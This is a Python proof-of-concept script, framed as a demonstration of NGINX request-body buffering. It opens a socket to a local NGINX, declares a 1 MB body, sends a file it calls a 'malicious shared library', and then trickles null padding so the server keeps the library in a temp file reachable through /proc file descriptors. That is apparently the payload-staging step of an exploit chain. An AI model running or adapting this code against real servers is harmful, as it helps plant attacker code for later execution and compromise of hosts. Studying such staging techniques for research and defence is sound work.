#!/usr/bin/env python3
"""
NGINX Client Body Buffering Demonstration Script

This script demonstrates how NGINX handles large request bodies by:
1. Establishing a connection to NGINX
2. Sending a request with a large Content-Length
3. Sending a malicious shared library followed by padding data
4. Maintaining the connection to allow for investigation
"""

import socket
import time


def main():
    """Main execution function for the NGINX demonstration."""
    # Connection parameters
    host = "localhost"
    port = 8080
    content_length = 1000000  # 1MB
    malicious_lib_path = "shared-library/hello_engine.so"
    chunk_size = 10240  # 10KB chunks for sending data
    pause_between_chunks = 20  # seconds

    # Establish connection to NGINX
    print("Creating socket connection to NGINX...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    
    # Prepare and send HTTP headers with the declared content length
    http_request = (
        f"POST /some-arbitrary-path HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Content-Type: application/octet-stream\r\n"
        f"Content-Length: {content_length}\r\n"
        f"\r\n"
    )
    sock.sendall(http_request.encode())
    
    # Send the malicious library first
    print("Sending malicious library...")
    bytes_sent = send_file(sock, malicious_lib_path)
    
    # Pause to allow for observation
    time.sleep(pause_between_chunks)

    # Send remaining data to reach the declared content length
    print("Sending padding data...")
    bytes_sent = send_padding(sock, bytes_sent, content_length, chunk_size, pause_between_chunks)
    
    # Keep the connection open for investigation
    print("Wrote partial data. NGINX is now waiting...")
    print("You can keep this script running, open another terminal")
    print("to investigate /proc/<NGINX PID>/fd in the container, etc.")
    
    # Clean up
    print("\nClosing connection...")
    sock.close()
    print("Done.")


def send_file(sock, file_path):
    """Send a file over the socket connection.
    
    Args:
        sock: Socket connection
        file_path: Path to the file to send
        
    Returns:
        int: Number of bytes sent
    """
    try:
        with open(file_path, "rb") as f:
            data = f.read()
            sock.sendall(data)
            print(f"Sent {file_path} ({len(data)} bytes)")
            return len(data)
    except FileNotFoundError:
        print(f"Error: File {file_path} not found")
        return 0


def send_padding(sock, bytes_already_sent, target_size, chunk_size, pause_seconds):
    """Send padding data to reach the target size.
    
    Args:
        sock: Socket connection
        bytes_already_sent: Bytes already sent
        target_size: Total bytes to send
        chunk_size: Size of each chunk
        pause_seconds: Seconds to pause between chunks
        
    Returns:
        int: Total number of bytes sent
    """
    bytes_sent = bytes_already_sent
    null_chunk = b'\x00' * chunk_size
    
    while bytes_sent < target_size:
        remaining = target_size - bytes_sent
        chunk_to_send = null_chunk if remaining >= chunk_size else b'\x00' * remaining
        
        sock.sendall(chunk_to_send)
        bytes_sent += len(chunk_to_send)
        print(f"Sent {bytes_sent}/{target_size} bytes ({(bytes_sent/target_size)*100:.1f}%)...")
        
        if bytes_sent < target_size:
            time.sleep(pause_seconds)
    
    return bytes_sent


if __name__ == "__main__":
    main()
